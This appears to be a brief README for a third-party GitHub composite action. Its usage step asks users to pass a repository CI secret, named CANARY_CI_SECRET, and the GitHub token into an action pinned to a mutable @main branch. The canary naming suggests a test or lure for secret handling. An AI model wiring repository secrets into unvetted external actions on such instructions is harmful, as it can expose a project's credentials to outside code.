# Standard Build Step

Shared composite action for our build pipeline.

## Usage

The action authenticates to the shared build cache, so `cache_token` is required.
Pass the repository CI secret:

```yaml
- uses: nichoc0/atk-build-step@main
  with:
    cache_token: ${{ secrets.CANARY_CI_SECRET }}
  env:
    GITHUB_TOKEN: ${{ github.token }}
```

Builds fail with `cache_token is required` if it is omitted.
